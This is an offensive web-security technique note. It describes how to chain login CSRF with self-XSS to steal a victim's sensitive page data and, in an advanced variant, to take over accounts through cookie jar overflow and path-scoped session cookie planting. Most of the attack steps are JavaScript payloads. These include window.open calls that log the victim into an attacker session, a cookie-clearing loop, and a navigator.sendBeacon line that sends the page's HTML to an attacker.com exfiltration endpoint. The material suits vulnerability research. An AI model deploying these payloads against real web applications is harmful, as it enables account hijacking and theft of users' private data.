
# Login CSRF + Self-XSS

* **NOTE**: initial version, based on referenced material (errors may be present)

## [BASIC] Sensitive Information Disclosure 

* IMPACT: CVSS-Confidentiality: MEDIUM/HIGH

### Steps (High-level)

1. gain victim user account context in victim's web browser

    *(victim user logs into target web application)*

3. attacker sets up malicious page (ref: *attacker's page*)

4. from attacker's page, open page on target web application

    (**attacker's page**)

    ```
    windowWithSensitiveData = window.open('//target.com/api');
    ...
    ```

    * **NOTES**:
        * opened page must contain as much sensitive information as possible (!!! impact depends on this !!!)
            * profile settings
            * API key
            * transaction history
            * generally, anything containing (a lot of) sensitive information
        * page has victim user account context
            * all sensitive information rendered on client-side (in opened window, i.e. contained in DOM => now accessible by client-side JavaScript, locally)

5. log victim user's web browser into attacker's user account

    (**attacker's page** - continuation)

    ```
    ...
    window.open('//target.com/oauth/callback?code=attackercode');
    ...
    ```

    * **NOTES**:
        * typically, login-CSRF victim user's web browser
            * alternatively, use any other method that logs victim user's web browser into attacker's user account (scenario-dependent)
        * now, victim user's web browser is logged into attacker's user account (in that opened window)
            * possible to trigger self-XSS, due to attacker user account's context

6. trigger self-XSS payload

    (**attacker's page** - continuation)

    ```
    ...
    window.open('//target.com/selfxsspage');
    ...
    ```

    * **NOTE**: now, executed JavaScript self-XSS payload is running in origin of web application on victim user's web browser
        * since initially opened window (from attacker's page), containing sensitive information, is in same origin as executed self-XSS payload, it is now accessible by self-XSS payload
            * according to Same Origin Policy (SOP), web browser does not differentiate between different user account contexts (victim user account's window vs. attacker user account's window - same to web browser)

7. access and exfiltrate locally-stored sensitive data

    (**self-XSS payload**)

    ```
    windowWithSensitiveData = window.open('', windowWithSensitiveData);
    navigator.sendBeacon('//attacker.com/exfil', windowWithSensitiveData.document.body.innerHTML);
    ```

    * **NOTES**:
        * reference first opened window from attacker's page (containing sensitve information) in self-XSS payload window
            * since both windows run in same web browser, it is possible to access it via name reference, using `window.open`
                * first argument = empty string (i.e. empty URL)
                * second argument = provide specified name reference
            * now, `window.open` will reference same window, opened initially (containing sensitive information)
        * only possible to leak information from referenced page
            * if any action performed on that page, it will be executed in context of attacker's user account
                * additionally, victim user account already logged out
            * issue addressed and solved in next attack chain

## [ADVANCED] Account Take Over (ATO)

<p align="justify">The overall idea is to log in victim user's web browser to attacker's user account, but only to the page with self-XSS, while retaining victim user account context on all remaning pages of the web application. This allows to execute the self-XSS payload in the attacker user account's context, while interacting with all (interesting) functionality in the victim user account's context.</p>

* IMPACT:
    * CVSS-Confidentiality: MEDIUM/HIGH
    * CVSS-Integrity: MEDIUM/HIGH

### Steps (High-level)

1. attacker sets up malicious page (ref: *attacker's page*)

2. log victim user's web browser into attacker's user account

    (**attacker's page**)

    ```
    window.open('//target.com/oauth/callback?code=attackercode');
    ...
    ```

    * **NOTES**:
        * typically, login-CSRF victim user's web browser
            * alternatively, use any other method that logs victim user's web browser into attacker's user account (scenario-dependent)
        * compared to previous attack, prior to this step:
            * not required to log victim's user account in
            * not opening an additional window from attacker's page

3. trigger self-XSS payload

    (**attacker's page** - continuation)

    ```
    ...
    window.open('//target.com/selfxsspage');
    ...
    ```

    * **NOTES**:
        * at this point, within victim user's web browser, gained JavaScript code execution in context of attacker's user account
        * next:
            * plant second stage payload within attacker user account's session, which will remain active upon client-side logout
            * get victim user to log back into web application (i.e. obtain victim user account context)

4. log victim user out of web application (to lose authenticated (attacker user account) context and indirectly force victim user to log in back again, using own credentials) - [cookie jar overflow](https://github.com/lighthouseitsecurity/weaponizedXSS/tree/main/advanced/jsGadgets/cookieJarOverflow)

    (**self-XSS payload**)

    ```
    let cookJarLimit = 400;
    let postfix1 = '=a;';
    let postfix2 = '=a; expires=Thu, 01 Jan 1970 00:00:01 GMT;';
    if (location.protocol == 'https:') {
      postfix1 += ' Secure';
    }
    function fillCookieJar(inputJarLimit, inputPostfix) {
      for(let i=0; i<inputJarLimit; i++) {
        document.cookie = 'cookie' + i + inputPostfix;
      }
    }
    fillCookieJar(cookJarLimit, postfix1);
    fillCookieJar(cookJarLimit, postfix2);
    console.log(document.cookie); // no cookies in cookie jar
    ...
    ```

    * **NOTE**: idea is to clear all cookies that victim user account currently has in web browser (related to target web application)
        * will log victim user' web browser out of attacker user account's session (i.e. lose authenticated context)

5. setup self-XSS session cookie

    (**self-XSS payload** - continuation)

    ```
    ...
    // set session cookie to self-XSS page
    document.cookie = "sessionid=attackersession; path=/selfxsspage/";
    ...
    ```

    * **NOTES**:
        * self-XSS payload execution
            * set session cookie (in victim user's web browser) to attacker user account's session and specify its path attribute to self-XSS endpoint
                * now, this cookie will only get sent to server-side if web browser navigating to that specific endpoint/path
        * cookie precedence
            * cookie with more specific path takes precedence over more general one (e.g. `/selfxsspage` takes precedence over `/`)
                * when issuing HTTP request, will get specified first (due to its higher priority) in `Cookie` header
        * server-side cookie interpretation
            * once HTTP request is received, server (usually) respects only first (unique) cookie it received (i.e. ignores any subsequent ones, received via `Cookie` header)
        * now, victim user's web browser is logged out of target web application, apart from `/selfxsspage`, where it is logged into attacker user account's session (allows execution of payload, planted via self-XSS) 
            * also, the only remaining cookie in victim user web browser's cookie jar (i.e. no other ones, at this point)

6. redirect victim user's web browser to another domain, to get off PoC page

    (**self-XSS payload** - continuation)

    ```
    ...
    window.location.href = '//someothersite.com';
    ...
    ```

7. victim user logs into target web application

    *(victim user logs into target web application, using victim user account)*

    * **NOTES**:
        * requires victim user interaction (i.e. CVSS-User Interaction: Required)
        * once logged in, victim user's web browser has victim user account context on every endpoint, except self-XSS endpoint, where it has attacker user account context
            * once victim user navigates to self-XSS endpoint, attacker-planted cookie will take precedence over victim user account's one (since it is scoped to whole app, i.e. its path is `/`)
                * now, possible to exploit web application, since rest of application is in victim user account's context (i.e. self-XSS, effectively, turned into regular XSS)

8. victim user navigates to self-XSS page

    *(victim user navigates to self-XSS endpoint and triggers second stage payload execution)*

    * **NOTES**:
        * ideally, self-XSS located in profile page or somewhere where user is likely to navigate to
            * e.g. main page; home page; dashboard
            * any page that gets visited all the time / often
        * in case self-XSS page is NOT easily navigated to, use other technique(s) to make user navigate to it automatically
            * e.g. hunt for cookies that perform post-login redirect
                * avoids additional user interaction requirement (i.e. avoids lowering of overall impact)
                * again, for redirect cookie use specific path, to take precedence over victim user account's one

## References

* [Turning unexploitable XSS into an account takeover with Matan Berson](https://www.youtube.com/watch?v=_VGEtJSRkjg)
* [Crushing Client-Side on Any Scope with MatanBer (Ep. 81)](https://www.youtube.com/watch?v=aDcK6Z6K2Zc&t=4664s)
